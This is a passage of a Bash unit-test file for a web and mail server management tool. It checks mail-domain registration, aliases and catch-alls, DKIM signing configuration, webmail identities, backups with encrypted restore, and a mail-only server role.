if (( CAN_CHMOD )); then assert_eq "and only root reads it" "600" "$(stat -c %a "$(lib_mail_domain_file own.example)")"; fi
assert_eq    "its mail state is kept in that record"    "$(lib_mail_domain_file own.example)" "$(lib_mail_json own.example)"
assert_eq    "a site's stays in the site's"             "$(lib_domain_json site.example)" "$(lib_mail_json site.example)"
assert_true  "a site is a domain mail can be on for"    lib_mail_domain_known site.example
assert_true  "and so is a mail domain"                  lib_mail_domain_known own.example
assert_false "anything else is not"                     lib_mail_domain_known nobody.example
assert_eq    "registering it again changes nothing"     0 "$(run_isolated lib_mail_domain_register own.example)"
lib_json_set "$(lib_mail_json own.example)" '.mail.enabled = true | .mail.selector = "lomp202602"'
assert_eq    "both kinds are domains with mail"         "own.example site.example" "$(lib_mail_domains | tr '\n' ' ' | sed 's/ $//')"
assert_true  "the flag is read from the right record"   lib_mail_domain_enabled own.example
# A record of its own wins over a site of the same name: the mail was there first, or was
# added on purpose beside the site, and removing the site must not take it away.
mkdir -p "$STATE_DIR/domains/own.example"; printf '{"domain":"own.example"}\n' >"$(lib_domain_json own.example)"
assert_eq    "its own record wins over a site of that name" "$(lib_mail_domain_file own.example)" "$(lib_mail_json own.example)"
assert_eq    "and the domain is listed once, not twice"     1 "$(lib_mail_domains | grep -c '^own[.]example$' || true)"
_rm_body="$(declare -f lib_domain_remove_main)"
_rm_own_ln="$(grep -n 'lib_mail_domain_standalone' <<<"$_rm_body" | tail -1 | cut -d: -f1 || true)"
_rm_purge_ln="$(grep -n 'lib_mail_domain_purge' <<<"$_rm_body" | head -1 | cut -d: -f1 || true)"
assert_true  "removing the site asks first whether the mail is its own" test "${_rm_own_ln:-0}" -gt 0
assert_true  "before anything of it is deleted"                         test "${_rm_own_ln:-0}" -lt "${_rm_purge_ln:-0}"
rm -rf "$STATE_DIR/domains/own.example"

# ---- one inbox for several domains ------------------------------------------
# "--to" gives a domain no mailbox of its own: its addresses are delivered into one that
# exists, and that mailbox may send as them.
lib_mail_passwd_set "me@site.example" "$_md_hash" "2G"
lib_mail_domain_register col.example
_md_run lib_mail_enable_main col.example --to Me@Site.Example --address info,Sales
_al="$(cat "$(lib_mail_alias_file col.example)" 2>/dev/null || true)"
assert_true  "mail is on for it"                         lib_mail_domain_enabled col.example
assert_has   "each address named goes into the mailbox"  $'info@col.example\tme@site.example' "$_al"
assert_has   "in lower case, whatever was typed"         $'sales@col.example\tme@site.example' "$_al"
assert_has   "postmaster arrives there too"              $'postmaster@col.example\tme@site.example' "$_al"
assert_eq    "no catch-all unless it is asked for"       0 "$(grep -c '^@' <<<"$_al" || true)"
assert_eq    "and the domain has no mailbox of its own"  "" "$(lib_mail_boxes col.example)"
assert_true  "the filter is told to sign for the other domain" test -s "$_md/sendas.log"
lib_mail_domain_register def.example
_md_run lib_mail_enable_main def.example --to me@site.example
assert_has   "one address by default, as --mailbox suggests one" $'info@def.example\tme@site.example' "$(cat "$(lib_mail_alias_file def.example)" 2>/dev/null || true)"
lib_mail_domain_register all.example
_md_run lib_mail_enable_main all.example --to me@site.example --catch-all
_al="$(cat "$(lib_mail_alias_file all.example)" 2>/dev/null || true)"
assert_eq    "a catch-all is one line that starts at the @" $'@all.example\tme@site.example' "$(grep '^@' <<<"$_al" || true)"
assert_lacks "and it brings no address of its own with it"  "info@all.example" "$_al"
assert_eq    "where every other address goes"               "me@site.example" "$(lib_mail_catchall all.example)"
assert_eq    "a domain without one answers nothing"         "" "$(lib_mail_catchall col.example)"
# an address is a mailbox or an alias, never both: Postfix resolves the alias first
lib_mail_domain_register keep.example
lib_json_set "$(lib_mail_json keep.example)" '.mail.enabled = true'
lib_mail_passwd_set "info@keep.example" "$_md_hash" "1G"
_md_run lib_mail_enable_main keep.example --to me@site.example --address info,sales
assert_lacks "a mailbox is never turned into an alias"   $'info@keep.example\t' "$(lib_mail_aliases keep.example)"
assert_has   "the address beside it still is"            $'sales@keep.example\tme@site.example' "$(lib_mail_aliases keep.example)"
assert_eq "--to a mailbox that is not on this server is refused" 1 "$(run_isolated _md_do lib_mail_enable_main col.example --to nobody@site.example)"
assert_eq "--mailbox and --to do not go together"                1 "$(run_isolated _md_do lib_mail_enable_main col.example --mailbox info --to me@site.example)"
assert_eq "--address means nothing without --to"                 1 "$(run_isolated _md_do lib_mail_enable_main col.example --address info)"
assert_eq "nor does --catch-all"                                 1 "$(run_isolated _md_do lib_mail_enable_main col.example --catch-all)"
assert_eq "an address name is checked like a mailbox name"       1 "$(run_isolated _md_do lib_mail_enable_main col.example --to me@site.example --address 'a/b')"
_md_out="$( ( _md_do lib_mail_enable_main stranger.example --mailbox info ) 2>&1 || true )"
assert_has "a domain this server does not know is refused"       "is not a domain of this server" "$_md_out"
assert_has "and the way to add one for its mail is named"        "lomp mail domain add stranger.example" "$_md_out"
assert_false "nothing was written for it"                        lib_mail_domain_known stranger.example

# ---- what Postfix reads -----------------------------------------------------
lib_mail_passwd_set "box@all.example" "$_md_hash" "1G"
_va="$(lib_mail_render_valias)"
# "@domain" takes every address with no line of its own, and a mailbox has none: without this
# its mail would follow the catch-all and never reach it
assert_eq    "a mailbox in a catch-all domain is pointed at itself" 1 "$(grep -c $'^box@all.example\tbox@all.example$' <<<"$_va" || true)"
assert_eq    "one in a domain without a catch-all is not"           0 "$(grep -c $'^me@site.example\tme@site.example$' <<<"$_va" || true)"
assert_eq    "the catch-all itself is in the table"                 1 "$(grep -c $'^@all.example\tme@site.example$' <<<"$_va" || true)"
_sn="$(lib_mail_render_senders)"
assert_eq    "the mailbox may send as an alias of another domain"   1 "$(grep -c $'^info@col.example\tme@site.example$' <<<"$_sn" || true)"
assert_eq    "and as any address of a domain it catches all of"     1 "$(grep -c $'^@all.example\tme@site.example$' <<<"$_sn" || true)"
assert_eq    "but a mailbox there keeps its own address to itself"  1 "$(grep -c $'^box@all.example\tbox@all.example$' <<<"$_sn" || true)"
assert_eq    "the renderers still exit 0" "0 0" "$(run_isolated lib_mail_render_valias) $(run_isolated lib_mail_render_senders)"

# ---- the alias commands -----------------------------------------------------
assert_true  "@domain is a name an alias can have"  lib_mail_alias_key_valid "@col.example"
assert_true  "so is an address, in any case"        lib_mail_alias_key_valid "Info@Col.Example"
assert_false "a bare @ is not"                      lib_mail_alias_key_valid "@"
assert_false "nor @ followed by something else"     lib_mail_alias_key_valid "@not a domain"
assert_false "nor a word with no @ at all"          lib_mail_alias_key_valid "info"
: >"$_md/sendas.log"
_md_run lib_mail_alias_add_main "@col.example" "Me@Site.Example"
assert_eq    "a catch-all can be added afterwards"   "me@site.example" "$(lib_mail_catchall col.example)"
assert_true  "and that, too, reaches the filter"     test -s "$_md/sendas.log"
_md_run lib_mail_alias_del_main "@col.example"
assert_eq    "and taken away again"                  "" "$(lib_mail_catchall col.example)"
# stored in lower case: the sender table is built from the targets, and Postfix compares them
# with a login Dovecot has already lowered
_md_run lib_mail_alias_add_main "news@col.example" "ME@Site.Example,Far@Outside.Example"
assert_has   "targets are stored in lower case"      $'news@col.example\tme@site.example,far@outside.example' "$(lib_mail_aliases col.example)"
: >"$_md/sendas.log"
_md_run lib_mail_alias_add_main "out@site.example" "far@outside.example"
assert_false "an alias that only leaves the server touches nothing else" test -s "$_md/sendas.log"
assert_eq    "an alias named like a mailbox is still refused" 1 "$(run_isolated _md_do lib_mail_alias_add_main "me@site.example" "info@col.example")"
assert_eq    "the aliases that name one address each"         6 "$(lib_mail_aliases col.example | wc -l | tr -d ' ')"

# ---- signing for the address a mailbox answers as ---------------------------
# Rspamd refused to sign when the login was not of the domain in From:. Postfix has already
# refused every sender the login does not own, and From: has to be of the sender's domain, so
# the login's own domain adds nothing - and without this, mail sent as an alias of another
# domain left the server unsigned.
_dk="$(lib_mail_render_rspamd_dkim dkim_signing)"
assert_has   "a mailbox is signed for an alias of another domain" "allow_username_mismatch = true;" "$_dk"
assert_has   "From: still has to match the sender Postfix checked" "allow_hdrfrom_mismatch = false;" "$_dk"
assert_has   "and only somebody who logged in is signed for"       "sign_authenticated = true;" "$_dk"
assert_has   "ARC follows the same rules"                          "allow_username_mismatch = true;" "$(lib_mail_render_rspamd_dkim arc)"
MAIL_RSPAMD_DIR="$_md/rspamd"; mkdir -p "$MAIL_RSPAMD_DIR"
printf 'allow_username_mismatch = false;\n' >"$MAIL_RSPAMD_DIR/dkim_signing.conf"
_md_sendas() { ( eval 'lib_mail_installed() { return 0; }
                       lib_mail_host() { printf "mail.site.example"; }
                       lib_mail_apply() { printf "%s\n" "$1" >"$_md/apply.log"; return 0; }'
                 _mail_sendas_current ) >/dev/null 2>&1 || true; }
rm -f "$_md/apply.log"; _md_sendas
assert_eq    "a server an older release set up is brought up to date" "mail.site.example" "$(cat "$_md/apply.log" 2>/dev/null || true)"
lib_mail_render_rspamd_dkim dkim_signing >"$MAIL_RSPAMD_DIR/dkim_signing.conf"
rm -f "$_md/apply.log"; _md_sendas
assert_false "one that is current is left alone" test -e "$_md/apply.log"

# ---- the webmail's identities -----------------------------------------------
# Roundcube answers from the identity a message was written to, but somebody has to create it.
# The list is rendered from the aliases; a plugin adds what is missing when the owner signs in.
_im="$(lib_webmail_render_identities)"
_im_me="$(grep $'^me@site.example\t' <<<"$_im" || true)"
assert_eq    "one line per mailbox"                              1 "$(grep -c $'^me@site.example\t' <<<"$_im" || true)"
assert_has   "with the addresses that are delivered into it"     "info@col.example" "$_im_me"
assert_has   "of every domain"                                   "info@def.example" "$_im_me"
assert_has   "and the ones added later"                          "news@col.example" "$_im_me"
assert_lacks "postmaster is not an address anybody answers as"   "postmaster@" "$_im"
assert_lacks "a catch-all names no address to offer"             $'\t@' "$_im"
assert_lacks "nor does it appear further along the line"         ",@" "$_im"
assert_lacks "an address outside this server is no mailbox"      $'far@outside.example\t' "$_im"
assert_eq    "the renderer exits 0"                              0 "$(run_isolated lib_webmail_render_identities)"
_ip="$(lib_webmail_render_identities_plugin)"
assert_has   "the plugin is a Roundcube plugin"                  "class lomp_identities extends rcube_plugin" "$_ip"
assert_has   "that acts when somebody signs in"                  "login_after" "$_ip"
assert_has   "adds what is missing"                              "insert_identity" "$_ip"
assert_lacks "and never removes an identity"                     "delete_identity" "$_ip"
# a redeclared property or return type is where a later Roundcube could turn this into a fatal
# error, which is every webmail down at once
assert_lacks "it redeclares nothing of the parent class"         'public $task' "$_ip"
assert_has   "a plugin that does not load is taken out again"    'rm -rf "$dir"' "$(declare -f lib_webmail_identities_plugin_install)"
assert_has   "the mail tables carry the list with them"          "lib_webmail_identities_apply" "$(declare -f lib_mail_tables_apply)"
WM_CURRENT="$_md/wm/current"; mkdir -p "$WM_CURRENT/plugins"
_wmc="$(lib_webmail_render_config 2>/dev/null || true)"
assert_true  "the webmail configuration renders here"            test -n "$_wmc"
assert_lacks "a release without the plugin is not told to load it" "'lomp_identities'" "$_wmc"
mkdir -p "$WM_CURRENT/plugins/lomp_identities"; printf '<?php\n' >"$WM_CURRENT/plugins/lomp_identities/lomp_identities.php"
_wmc="$(lib_webmail_render_config 2>/dev/null || true)"
assert_has   "one that has it is"                                "'password', 'lomp_identities']" "$_wmc"
assert_has   "and is told where the list is"                     "lomp_identities_map'] = '${WM_IDENT_MAP}'" "$_wmc"
# A webmail an older release installed has neither the plugin nor the line that names it. The
# line that says where the list is does not count: it is written either way, so a configuration
# rendered before the release had the plugin carries it too.
if (( CAN_SYMLINK )); then
  rm -rf "$_md/wm"; mkdir -p "$_md/wm/releases/1.7.4/public_html" "$_md/wm/releases/1.7.4/plugins"
  printf '<?php\n' >"$_md/wm/releases/1.7.4/public_html/index.php"
  ln -sfn "$_md/wm/releases/1.7.4" "$_md/wm/current"
  WM_CURRENT="$_md/wm/current"; WM_IDENT_MAP="$_md/wm/identities.map"; WM_CONF="$_md/wm/config.inc.php"
  _md_ident() { ( eval 'lib_webmail_config_apply() { printf "applied\n" >>"$_md/wm/apply.log"; return 0; }'
                  lib_webmail_identities_apply ) >/dev/null 2>&1 || true; }
  printf "<?php\n\$config['plugins'] = ['password'];\n\$config['lomp_identities_map'] = 'x';\n" >"$WM_CONF"
  rm -f "$_md/wm/apply.log"; _md_ident
  assert_has  "the list is written where the webmail reads it"            "info@col.example" "$(cat "$WM_IDENT_MAP" 2>/dev/null || true)"
  assert_true "a webmail that does not name the plugin yet is brought up to date" test -s "$_md/wm/apply.log"
  printf "<?php\n\$config['plugins'] = ['password', 'lomp_identities'];\n" >"$WM_CONF"
  rm -f "$_md/wm/apply.log"; _md_ident
  assert_false "one that does is left alone"                              test -e "$_md/wm/apply.log"
  unset -f _md_ident
fi
assert_has   "switching a webmail on writes the list as well"    "lib_webmail_identities_apply" "$(declare -f lib_webmail_domain_enable)"
_wi="$(declare -f lib_webmail_install)"
_wi_cur_ln="$(grep -n '_wm_current_set' <<<"$_wi" | head -1 | cut -d: -f1 || true)"
_wi_cfg_ln="$(grep -n 'lib_webmail_config_apply' <<<"$_wi" | tail -1 | cut -d: -f1 || true)"
assert_true  "a new webmail is configured again once its release is the running one" test "${_wi_cur_ln:-0}" -gt 0 -a "${_wi_cur_ln:-0}" -lt "${_wi_cfg_ln:-0}"

# ---- mail domain add / list / del -------------------------------------------
assert_eq "a site is not added a second time as a mail domain" 1 "$(run_isolated _md_do lib_mail_domain_add_main site.example --mailbox info)"
assert_false "and gets no record of its own that way"          lib_mail_domain_standalone site.example
_md_run lib_mail_domain_add_main Hub.Example --to me@site.example --address info
assert_true  "a domain is added and its mail turned on in one go" lib_mail_domain_enabled hub.example
assert_true  "as a mail domain"                                   lib_mail_domain_standalone hub.example
assert_has   "with its address delivered where it was told"       $'info@hub.example\tme@site.example' "$(lib_mail_aliases hub.example)"
assert_eq    "adding it again is not an error"                    0 "$(run_isolated _md_do lib_mail_domain_add_main hub.example --to me@site.example --address info)"
_ml="$( ( OPT_JSON=1; lib_mail_domain_list_main ) 2>/dev/null || true )"
assert_eq    "the list knows a site from a mail domain" "true false" \
  "$(jq -r '[.[] | select(.domain == "site.example" or .domain == "col.example")] | sort_by(.domain) | reverse | map(.site | tostring) | join(" ")' <<<"$_ml")"
assert_eq    "its mailboxes, aliases and catch-all"     "1 3 me@site.example" \
  "$(jq -r '.[] | select(.domain == "all.example") | "\(.mailboxes) \(.aliases) \(.catch_all)"' <<<"$_ml")"
assert_eq    "and a domain with none says so"           "null" "$(jq -r '.[] | select(.domain == "col.example") | .catch_all | tostring' <<<"$_ml")"
# "credentials" answers for a mail domain too: what a mail client needs, and where the addresses
# of a domain without a mailbox of its own are delivered
_md_cred() { ( eval "$_md_stubs"; eval 'lib_mail_host() { printf "mail.site.example"; }'; lib_domain_credentials_main "$1" ) 2>&1 || true; }
_cr="$(_md_cred col.example)"
assert_has   "credentials knows a mail domain"                 "mail domain (its mail is here; no site on this server)" "$_cr"
assert_has   "and what a mail client needs for it"             "mail.site.example:993" "$_cr"
assert_has   "a domain with no mailbox says where its addresses go" "info@col.example -> me@site.example" "$_cr"
assert_has   "and that it has no login of its own"             "none of its own" "$_cr"
assert_lacks "postmaster is not listed with them"              "postmaster@col.example" "$_cr"
assert_has   "a catch-all is said in words"                    "Every other address" "$(_md_cred all.example)"
assert_has   "a mailbox is still named with its size"          "box@all.example (1G)" "$(_md_cred all.example)"
assert_has   "a name that is neither is still refused"         "is not registered" "$(_md_cred nobody.example)"
unset -f _md_cred
_mt="$(lib_mail_domain_list_main 2>/dev/null || true)"
assert_has   "the table names the kind"                 "mail " "$(grep '^all[.]example' <<<"$_mt" || true)"
assert_has   "and marks a catch-all"                    "+all" "$(grep '^all[.]example' <<<"$_mt" || true)"
assert_has   "its columns in line"                      "mail  on     1      3+all" "$(grep '^all[.]example' <<<"$_mt" || true)"
# "kapalı" is a letter longer than MAIL was wide: the column holds it
_mt="$( ( LIB_LANG="tr"; lib_lang_build; eval 'lib_mail_domain_enabled() { [[ "$1" != all.example ]]; }'; lib_mail_domain_list_main ) 2>/dev/null || true )"
assert_has   "in Turkish the headings"                  "TÜR   POSTA  KUTU   TAKMA AD  WEBMAIL  SERTİFİKA" "$_mt"
assert_has   "a domain whose mail is off, in line too"  "mail  kapalı 1      3+all" "$(grep '^all[.]example' <<<"$_mt" || true)"
# removing one: a last backup first, the mail and the lines gone, the record archived
lib_mail_passwd_set "inbox@hub.example" "$_md_hash" "1G"
lib_mail_alias_set col.example "x@col.example" "inbox@hub.example,me@site.example"
rm -f "$_md/backup.log"
_md_run lib_mail_domain_del_main hub.example
assert_false "a removed mail domain has no record"          lib_mail_domain_standalone hub.example
assert_has   "a last backup was taken first"                "hub.example --tag pre-remove" "$(cat "$_md/backup.log" 2>/dev/null || true)"
assert_false "its mailbox is gone"                          lib_mail_box_exists "inbox@hub.example"
assert_false "and nothing of it is left"                    lib_mail_domain_has_traces hub.example
assert_true  "the record is archived, not deleted"          bash -c "compgen -G '${MAIL_DOMAINS_GONE_DIR}/hub.example.[0-9]*' >/dev/null"
# an alias in another domain that was delivered into it would accept mail and bounce it
assert_has   "what pointed at its mailbox goes with it"     $'x@col.example\tme@site.example' "$(lib_mail_aliases col.example)"
assert_lacks "in every domain"                              "inbox@hub.example" "$(cat "$MAIL_ALIAS_DIR"/* 2>/dev/null || true)"
# there is no site archive beside a mail domain: the backup that fails is a reason to stop
assert_eq    "a backup that fails stops the removal"        1 "$(_md_backup_rc=1 run_isolated _md_do lib_mail_domain_del_main col.example)"
assert_true  "and the domain is as it was"                  lib_mail_domain_enabled col.example
assert_has   "aliases included"                             $'info@col.example\tme@site.example' "$(lib_mail_aliases col.example)"
assert_eq    "a site is not removed with this command"      1 "$(run_isolated _md_do lib_mail_domain_del_main site.example)"
assert_eq    "nor a domain nobody added"                    1 "$(run_isolated _md_do lib_mail_domain_del_main nobody.example)"
# A selector that has been in DNS must never be handed to a second key. A domain removed and
# added again in the same month would get exactly that name, so the archived record gives the
# list back - and only to the domain it belongs to: example.com.tr starts with example.com.
mkdir -p "$MAIL_DOMAINS_GONE_DIR/back.example.20260101-000000" "$MAIL_DOMAINS_GONE_DIR/back.example.tr.20260301-000000"
printf '{"domain":"back.example","mail":{"selectors_used":["lomp202601","lomp202601b"]}}\n' >"$MAIL_DOMAINS_GONE_DIR/back.example.20260101-000000/domain.json"
printf '{"domain":"back.example.tr","mail":{"selectors_used":["lomp209912"]}}\n' >"$MAIL_DOMAINS_GONE_DIR/back.example.tr.20260301-000000/domain.json"
# the other domain's archive is the newer one, which is what "the newest that matches" would
# pick: two directories made in the same instant tie, and a tie is broken by name
touch -d '2026-01-01 00:00:00' "$MAIL_DOMAINS_GONE_DIR/back.example.20260101-000000"
touch -d '2026-03-01 00:00:00' "$MAIL_DOMAINS_GONE_DIR/back.example.tr.20260301-000000"
lib_mail_domain_register back.example
assert_eq    "a domain that comes back remembers its selectors" '["lomp202601","lomp202601b"]' "$(jq -c '.mail.selectors_used' "$(lib_mail_domain_file back.example)")"
lib_mail_domain_register fresh.example
assert_eq    "a new one starts with none"                       "null" "$(jq -c '.mail' "$(lib_mail_domain_file fresh.example)")"
assert_has   "enabling it then avoids the names it has used"    "selectors_used" "$(declare -f lib_mail_enable_main)"

# ---- backups ----------------------------------------------------------------
# "backup --all" walks the sites, and a server that carries only mail has none: its nightly run
# backed up nothing. A mail domain's backup is its mail archive.
_bm="$(declare -f lib_backup_main)"
assert_has   "backup --all takes the mail domains too"       "lib_mail_standalone_domains" "$_bm"
assert_has   "and one of them can be named"                  "lib_backup_mail_domain" "$_bm"
rm -f "$_md/backup.log"
( eval "$_md_stubs"; eval 'lib_mail_backup_domain() { printf "%s\n" "$*" >>"$_md/backup.log"; MAIL_BACKUP_LAST_FILE="$_md/x.tar.gz"; return 0; }'
  lib_backup_mail_domain col.example --keep 7 --tag nightly; printf '%s' "$BK_LAST_FILE" >"$_md/bk.last" ) >/dev/null 2>&1 || true
assert_eq    "the mail keeps its own retention, not the sites'" "col.example --tag nightly" "$(cat "$_md/backup.log" 2>/dev/null || true)"
assert_eq    "and the archive is the one reported"              "$_md/x.tar.gz" "$(cat "$_md/bk.last" 2>/dev/null || true)"
rm -f "$_md/backup.log"
_md_run lib_backup_mail_domain col.example --no-mail
assert_false "--no-mail leaves nothing to do for a mail domain" test -e "$_md/backup.log"
assert_eq    "a mail backup that fails is a failed backup"      1 "$(_md_backup_rc=1 run_isolated _md_do lib_backup_mail_domain col.example)"
# A restore onto a server that has never heard of the domain - the disaster recovery of a mail
# server. It used to write the state into the SITES' registry, which made a "site" with no
# user, no home and no virtual host.
_ar="$_md/ar"; mkdir -p "$_ar/mail" "$BACKUP_ROOT/dr.example"
printf '{"format":1,"kind":"mail","domain":"dr.example","created_at":"2026-01-01T00:00:00Z","maildirs":"doveadm"}\n' >"$_ar/manifest.json"
printf '{"enabled":true,"selector":"lomp202603","selectors_used":["lomp202603"]}\n' >"$_ar/mail/state.json"
printf 'info@dr.example\tme@site.example\n' >"$_ar/mail/aliases"
tar -C "$_ar" -czf "$BACKUP_ROOT/dr.example/dr.example-mail-20260101-000000.tar.gz" .
_md_run lib_mail_restore_domain dr.example "$BACKUP_ROOT/dr.example/dr.example-mail-20260101-000000.tar.gz"
assert_true  "a restored domain nobody knew becomes a mail domain" lib_mail_domain_standalone dr.example
assert_false "and not a site that has no site"                     lib_domain_registered dr.example
assert_true  "with the state the archive carried"                  lib_mail_domain_enabled dr.example
assert_eq    "its selector"                                        "lomp202603" "$(lib_mail_selector dr.example)"
assert_has   "and its aliases"                                     $'info@dr.example\tme@site.example' "$(lib_mail_aliases dr.example)"
_rsd="$(declare -f lib_mail_restore_domain)"
_rs_reg_ln="$(grep -n 'lib_mail_domain_register' <<<"$_rsd" | head -1 | cut -d: -f1 || true)"
_rs_state_ln="$(grep -n 'state.json' <<<"$_rsd" | head -1 | cut -d: -f1 || true)"
assert_true  "the record is made before the state is written into it" test "${_rs_reg_ln:-0}" -gt 0 -a "${_rs_reg_ln:-0}" -lt "${_rs_state_ln:-0}"
# an archive made with --encrypt is an archive too: a restore neither found one nor could read it
printf 'k3y-for-the-unit-test\n' >"$BACKUP_KEY_FILE"
mkdir -p "$BACKUP_ROOT/enc.example"
sed -i 's/dr[.]example/enc.example/g' "$_ar/manifest.json" "$_ar/mail/aliases"
tar -C "$_ar" -czf "$_md/enc-plain.tar.gz" .
if openssl enc -aes-256-cbc -md sha256 -pbkdf2 -iter 200000 -salt -in "$_md/enc-plain.tar.gz" \
     -out "$BACKUP_ROOT/enc.example/enc.example-mail-20260102-000000.tar.gz.enc" -pass "file:${BACKUP_KEY_FILE}" 2>/dev/null \
   && openssl enc -d -aes-256-cbc -md sha256 -pbkdf2 -iter 200000 -in "$BACKUP_ROOT/enc.example/enc.example-mail-20260102-000000.tar.gz.enc" \
     -pass "file:${BACKUP_KEY_FILE}" 2>/dev/null | cmp -s - "$_md/enc-plain.tar.gz"; then
  assert_eq   "an encrypted mail archive is one a restore finds" "$BACKUP_ROOT/enc.example/enc.example-mail-20260102-000000.tar.gz.enc" "$(lib_mail_backup_latest enc.example)"
  _md_run lib_mail_restore_domain enc.example ""
  assert_true "and one it can read"                              lib_mail_domain_enabled enc.example
  assert_has  "all of it"                                        $'info@enc.example\tme@site.example' "$(lib_mail_aliases enc.example)"
  printf 'another key\n' >"$BACKUP_KEY_FILE"
  assert_eq   "with the wrong key it stops and says so"          1 "$(run_isolated _md_do lib_mail_restore_domain enc.example "")"
fi
assert_has   "a mail archive handed to 'restore' is sent to the right command" "This archive holds mail, not a site" "$(declare -f lib_restore_main)"

# ---- a server for mail alone ------------------------------------------------
# install --mail-only: the same mail server, with the web stack only because the webmail needs
# one. The role is recorded, kept across re-runs, and decides what "add" and the menu do.
assert_eq    "a server is a web server unless it was told otherwise" "web" "$(lib_server_role)"
assert_eq    "--mail-only makes it a mail server, with mail"  "mail 1" "$( ( lib_install_parse_args --mail-only --mail-hostname mail.site.example --skip-upgrade >/dev/null 2>&1; printf '%s %s' "$INS_ROLE" "$INS_WITH_MAIL" ) )"
assert_eq    "--role mail is the same thing"                  "mail 1" "$( ( lib_install_parse_args --role mail --skip-upgrade >/dev/null 2>&1; printf '%s %s' "$INS_ROLE" "$INS_WITH_MAIL" ) )"
assert_eq    "a role nobody knows is refused"                 1 "$(run_isolated lib_install_parse_args --role database --skip-upgrade)"
assert_eq    "an install that names no role sets none"        "" "$( ( lib_install_parse_args --skip-upgrade >/dev/null 2>&1; printf '%s' "$INS_ROLE" ) )"
lib_manifest_set '.params.role' 'mail'
lib_manifest_set '.installed_at' '2026-10-04T00:00:00Z'
assert_eq    "the role is read back from the manifest"        "mail" "$(lib_server_role)"
assert_true  "and that is what mail-only means"               lib_server_mail_only
# a re-run - every optional component the menu adds is one - must not turn it back
assert_eq    "a re-run that says nothing keeps the role"      "mail 1" "$( ( lib_install_parse_args --skip-upgrade >/dev/null 2>&1; printf '%s %s' "$INS_ROLE" "$INS_WITH_MAIL" ) )"
assert_eq    "--role web is the way back"                     "web" "$( ( lib_install_parse_args --role web --skip-upgrade >/dev/null 2>&1; printf '%s' "$INS_ROLE" ) )"
assert_eq    "and what this run was asked for wins over the manifest" "web" "$( ( INS_ROLE=web; lib_server_role ) )"
assert_has   "the params object is merged, so the role survives the manifest step" "lib_manifest_merge_json '.params'" "$(declare -f lib_install_manifest)"
assert_has   "a server with sites cannot be declared mail-only over their heads"   "cannot become a mail-only server" "$(declare -f lib_install_main)"
# a mail server needs a name to send as: asked before the first package, not at step 17
_im_body="$(declare -f lib_install_main)"
_im_name_ln="$(grep -n 'no name to send mail as' <<<"$_im_body" | head -1 | cut -d: -f1 || true)"
_im_step_ln="$(grep -n 'lib_steps_begin' <<<"$_im_body" | head -1 | cut -d: -f1 || true)"
assert_true  "a mail server with no name to send as stops before anything is installed" test "${_im_name_ln:-0}" -gt 0 -a "${_im_name_ln:-0}" -lt "${_im_step_ln:-0}"
# MariaDB holds the webmail's settings and nothing else; the memory belongs to the mail filter
SYS_ANALYZED=1; SYS_RAM_MB=4096; SYS_RAM_AVAIL_MB=3000; SYS_CPU_CORES=2; SYS_DISK_TYPE=ssd; SYS_SWAP_MB=0
DB_BUFFER_PERCENT=""; REDIS_MAX_PERCENT=""
lib_system_profile
assert_eq    "a mail server's database gets the smallest share" "5 2" "${CALC_DB_BUFFER_PCT} ${CALC_REDIS_PCT}"
DB_BUFFER_PERCENT="30"; lib_system_profile
assert_eq    "unless the operator named one"                    "30" "$CALC_DB_BUFFER_PCT"
DB_BUFFER_PERCENT=""
_md_out="$( ( _md_do lib_domain_add_main shop.example --no-ssl ) 2>&1 || true )"
assert_has   "a site is refused on a mail-only server"          "set up for mail only" "$_md_out"
assert_has   "with the command that does what was meant"        "lomp mail domain add shop.example" "$_md_out"
assert_false "and nothing was registered"                       lib_domain_registered shop.example
assert_has   "restoring a site there is refused the same way"   "cannot be restored here" "$(declare -f lib_restore_main)"
_md_out="$( ( _md_do lib_mail_enable_main stranger.example ) 2>&1 || true )"
assert_lacks "and nobody there is told to add a site"           "lomp add stranger.example" "$_md_out"
assert_has   "its menu is the mail menu"                        "_menu_mail top" "$(declare -f lib_menu_main)"
lib_json_set "$STATE_DIR/manifest.json" 'del(.params.role)'
lib_system_profile
assert_eq    "a web server keeps the profile it always had"     "40 8" "${CALC_DB_BUFFER_PCT} ${CALC_REDIS_PCT}"

# The menu: a site of this server gets its mail switched on, anything else is added for its mail
# alone, and either can be delivered into a mailbox that exists.
_mmail() {   # domain [question=answer...] -> the command the menu runs
  (
    eval '_menu_ask() { local -n _o="$1"; _o="${_ma[$1]-${3:-}}"; }
          _menu_run() { printf "%s\n" "$*"; }
          _menu_pause() { return 0; }'
    declare -A _ma=([domain]="$1"); shift
    for _kv in "$@"; do _ma[${_kv%%=*}]="${_kv#*=}"; done
    _menu_mail_add_domain 2>/dev/null | tail -n 1
  )
}
assert_eq "Enter everywhere on a site: its mail is switched on" \
  "mail enable site.example --mailbox info --quota 2G" "$(_mmail site.example)"
assert_eq "anything else is added for its mail alone" \
  "mail domain add shop.example --mailbox info --quota 2G" "$(_mmail Shop.Example)"
assert_eq "into a mailbox that exists, one address" \
  "mail domain add shop.example --to me@site.example --address info" "$(_mmail shop.example how=2 to=me@site.example)"
assert_eq "or every address" \
  "mail domain add shop.example --to me@site.example --catch-all" "$(_mmail shop.example how=2 to=me@site.example 'addrs=*')"
assert_eq "a dash gives it no mailbox yet" \
  "mail domain add shop.example" "$(_mmail shop.example box=-)"
assert_eq "what the picker offers: the domains whose mail is on" "all.example col.example" \
  "$(_menu_mail_domains | grep -E '^(all|col)[.]example$' | tr '\n' ' ' | sed 's/ $//')"

eval "$_md_saved_vars"; eval "$_md_saved_fn"
unset -f _md_do _md_run _md_sendas _mmail

# =============================================================================
section "the webmail forgets a mailbox that is gone, and only one that is gone"
# Roundcube keeps a user of its own for every address that has signed in - the address book,
# the identities, the settings - and finds it by the address alone. A mailbox deleted and made
# again under the same name, for somebody else, signed in to the previous owner's contacts. So
# the webmail's user goes with a mailbox that is removed for good, and with no other: one that
# "mail disable" puts aside comes back with everything it had.
_wf="$TMP/wmforget"; rm -rf "$_wf"; mkdir -p "$_wf"
_wf_saved_fn="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_wf_saved_vars="$(declare -p STATE_DIR MAIL_STATE_DIR MAIL_DOMAINS_DIR MAIL_DOMAINS_GONE_DIR MAIL_ALIAS_DIR MAIL_DISABLED_DIR MAIL_PASSWD_FILE MAIL_DKIM_DIR MAIL_VMAIL_HOME BACKUP_ROOT WM_CURRENT WM_INFO)"
STATE_DIR="$_wf/state"; mkdir -p "$STATE_DIR/domains"
lib_state_init
